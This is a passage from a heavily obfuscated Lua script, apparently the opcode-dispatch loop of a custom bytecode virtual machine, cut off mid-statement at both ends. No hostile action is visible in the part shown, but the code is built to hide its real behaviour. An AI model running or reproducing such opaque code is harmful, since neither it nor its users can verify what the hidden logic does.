bb=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[898]]=j[y[716]];end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][y[585]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[898]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z>44 then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bc=y[716];bb=y[585];ba=k(w,g,bc,bb);w[y[898]]=ba;else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif 68>=z then if z<=56 then if z<=50 then if(z==47 or z<47)then if not(46~=z)then local ba,bb=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1<ba then n=n+1;else w[y[898]]=w[y[716]]%w[y[585]];end end else if ba<=3 then y=f[n];else if 4==ba then w[y[898]]=w[y[716]]+y[585];else n=n+1;end end end else if ba<=8 then if ba<=6 then y=f[n];else if 7==ba then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=9 then y=f[n];else if 10==ba then w[y[898]]=w[y[716]];else n=n+1;end end end end else if ba<=17 then if ba<=14 then if ba<=12 then y=f[n];else if 13<ba then n=n+1;else w[y[898]]=w[y[716]];end end else if ba<=15 then y=f[n];else if ba~=17 then w[y[898]]=w[y[716]];else n=n+1;end end end else if ba<=20 then if ba<=18 then y=f[n];else if ba~=20 then w[y[898]]=w[y[716]];else n=n+1;end end else if ba<=22 then if ba<22 then y=f[n];else bb=y[898]end else if ba==23 then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end end ba=ba+1 end else local ba=y[898];local bb=w[y[716]];w[(ba+1)]=bb;w[ba]=bb[y[585]];end;elseif(48>=z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[898]]=j[y[716]];else bb=nil end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if 4==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if 6<ba then w[y[898]]=h[y[716]];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if ba>10 then n=n+1;else w[y[898]]=w[y[716]][y[585]];end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[898]end else if ba>14 then break else w[bb]=w[bb](w[bb+1])end end end end ba=ba+1 end elseif z>49 then local ba=y[898]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[585]do bc=bc+1;w[bd]=bb[bc];end else local ba=w[y[585]];if not ba then n=n+1;else w[y[898]]=ba;n=y[716];end;end;elseif 53>=z then if 51>=z then if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;elseif z==52 then a(c,e);else w[y[898]]=#w[y[716]];end;elseif z<=54 then w[y[898]]=(w[y[716]]%w[y[585]]);elseif z~=56 then local ba=y[898]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else if w[y[898]]then n=n+1;else n=y[716];end;end;elseif 62>=z then if 59>=z then if 57>=z then local ba=y[898];do return w[ba],w[(ba+1)]end elseif z==58 then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])else local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=60 then w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;elseif 61<z then if w[y[898]]then n=n+1;else n=y[716];end;else j[y[716]]=w[y[898]];end;elseif 65>=z then if z<=63 then local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif z>64 then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=66 then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end elseif 68>z then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif 80>=z then if 74>=z then if z<=71 then if z<=69 then w[y[898]][y[716]]=y[585];elseif 70==z then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]]*y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif 72>=z then w[y[898]]=w[y[716]][y[585]];elseif 73==z then w[y[898]]=w[y[716]]/y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]-w[y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]]/y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]*y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];n=y[716];else if(w[y[898]]<=w[y[585]])then n=n+1;else n=y[716];end;end;elseif z<=77 then if z<=75 then a(c,e);elseif z~=77 then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bc=y[716];bb=y[585];ba=k(w,g,bc,bb);w[y[898]]=ba;else local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif 78>=z then local ba=y[898]w[ba](r(w,ba+1,p))elseif z>79 then local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;end;elseif 86>=z then if z<=83 then if 81>=z then local ba;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba]()elseif z<83 then if not w[y[898]]then n=n+1;else n=y[716];end;else local ba=y[898];do return w[ba](r(w,ba+1,y[716]))end;end;elseif 84>=z then local ba;local bb,bc;local bd;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];bd=y[898]bb,bc=i(w[bd](r(w,bd+1,y[716])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;elseif z>85 then w[y[898]]=w[y[716]][w[y[585]]];else local ba;w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];ba=y[898]w[ba](r(w,ba+1,y[716]))end;elseif 89>=z then if z<=87 then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba>3 then y=f[n];else n=n+1;end end end else if ba<=7 then if ba<=5 then w[y[898]]=h[y[716]];else if 7>ba then n=n+1;else y=f[n];end end else if ba<=8 then w[y[898]]=w[y[716]][y[585]];else if ba~=10 then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[898]]=h[y[716]];else if ba~=13 then n=n+1;else y=f[n];end end else if ba<=14 then w[y[898]]=h[y[716]];else if 15==ba then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[898]]=w[y[716]][w[y[585]]];else if 18==ba then n=n+1;else y=f[n];end end else if ba<=20 then bb=y[898]else if ba<22 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif z<89 then local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])end;elseif 90>=z then local ba=0 while true do if(ba<=6)then if(ba==2 or ba<2)then if(ba==0 or ba<0)then w[y[898]]=false;else if(ba>1)then y=f[n];else n=(n+1);end end else if(ba<=4)then if(ba~=4)then w[y[898]]=h[y[716]];else n=n+1;end else if(ba~=6)then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if(ba==9 or ba<9)then if ba<=7 then n=n+1;else if(ba==8)then y=f[n];else w[y[898]]=w[y[716]][w[y[585]]];end end else if(ba==11 or ba<11)then if not(ba==11)then n=n+1;else y=f[n];end else if not(ba==13)then if(w[y[898]]~=y[585])then n=(n+1);else n=y[716];end;else break end end end end ba=(ba+1)end elseif z~=92 then do return w[y[898]]end else local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=138 then if 115>=z then if 103>=z then if z<=97 then if z<=94 then if 94~=z then if(w[y[898]]<=w[y[585]])then n=y[716];else n=n+1;end;else if(w[y[898]]<w[y[585]])then n=n+1;else n=y[716];end;end;elseif 95>=z then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end elseif z==96 then w[y[898]]=y[716]*w[y[585]];else local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=100 then if z<=98 then w[y[898]]=w[y[716]][w[y[585]]];elseif z>99 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else w[y[898]]=w[y[716]]-w[y[585]];end;elseif 101>=z then if(w[y[898]]~=y[585])then n=y[716];else n=n+1;end;elseif 103>z then local ba;local bb;local bc;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]]*y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=109 then if 106>=z then if 104>=z then local ba;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif 105<z then local ba=y[898];local bb=w[y[716]];w[ba+1]=bb;w[ba]=bb[w[y[585]]];else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=107 then w[y[898]]();elseif 108<z then local ba=y[898]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bc=y[716];bb=y[585];ba=k(w,g,bc,bb);w[y[898]]=ba;end;elseif z<=112 then if z<=110 then w[y[898]]={};elseif z~=112 then local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=113 then local ba=y[898];local bb=w[y[716]];w[ba+1]=bb;w[ba]=bb[w[y[585]]];elseif 115~=z then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else h[y[716]]=w[y[898]];end;elseif 126>=z then if z<=120 then if 117>=z then if z~=117 then w[y[898]]=true;else local ba;local bb;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bb=y[898];ba=w[bb];for bc=bb+1,y[716]do t(ba,w[bc])end;end;elseif 118>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[898]]=w[y[716]][y[585]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[898]]=h[y[716]];else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[898]else if 17==ba then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end end ba=ba+1 end elseif 119==z then w[y[898]]=w[y[716]]+w[y[585]];else w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;end;elseif z<=123 then if 121>=z then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba](r(w,ba+1,y[716]))elseif z<123 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba=y[898]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;end;elseif 124>=z then local ba;local bb;local bc;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end elseif z<126 then local ba=y[898];do return w[ba],w[ba+1]end else w[y[898]]={r({},1,y[716])};end;elseif 132>=z then if 129>=z then if z<=127 then w[y[898]][y[716]]=w[y[585]];elseif z~=129 then w[y[898]][y[716]]=y[585];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];else local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])end;elseif z<=130 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898];w[ba]=w[ba]-w[ba+2];n=y[716];elseif 131<z then local ba=y[716];local bb=y[585];local ba=k(w,g,ba,bb);w[y[898]]=ba;else local ba=y[898]local bb={w[ba](r(w,ba+1,y[716]))};local bc=0;for bd=ba,y[585]do bc=bc+1;w[bd]=bb[bc];end;end;elseif 135>=z then if(133==z or 133>z)then local ba=y[898];local bb,bc,bd=w[ba],w[(ba+1)],w[(ba+2)];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[716];w[(ba+3)]=bb;end;elseif(135>z)then local ba=d[y[716]];local bb={};local bc={};for bd=1,y[585]do n=(n+1);local be=f[n];if not(be[226]~=15)then bc[(bd-1)]={w,be[716],nil,nil};else bc[(bd-1)]={h,be[716],nil,nil};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[898]]=b(ba,bb,j);else local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2>ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if ba~=5 then y=f[n];else w[y[898]]=false;end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba~=8 then y=f[n];else w[y[898]]=j[y[716]];end end else if ba<=10 then if ba==9 then n=n+1;else y=f[n];end else if ba>11 then n=n+1;else for bc=y[898],y[716],1 do w[bc]=nil;end;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba<15 then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=16 then y=f[n];else if ba<18 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20<ba then n=n+1;else w[y[898]]=w[y[716]];end end else if ba<=23 then if ba>22 then bb=y[898]else y=f[n];end else if ba>24 then break else w[bb]=w[bb](w[bb+1])end end end end end ba=ba+1 end end;elseif z<=136 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif z<138 then local ba;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else for ba=y[898],y[716],1 do w[ba]=nil;end;end;elseif 161>=z then if(149>z or 149==z)then if(143>z or 143==z)then if(140>z or 140==z)then if(140>z)then local ba,bb,bc,bd=0 while true do if(ba<=9)then if ba<=4 then if(ba==1 or ba<1)then if(1~=ba)then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if 3==ba then w[y[898]]=h[y[716]];else n=(n+1);end end end else if(ba==6 or ba<6)then if(5<ba)then w[y[898]]=h[y[716]];else y=f[n];end else if(ba<7 or ba==7)then n=(n+1);else if not(ba==9)then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=14 then if(ba<11 or ba==11)then if not(ba~=10)then n=(n+1);else y=f[n];end else if(ba<=12)then 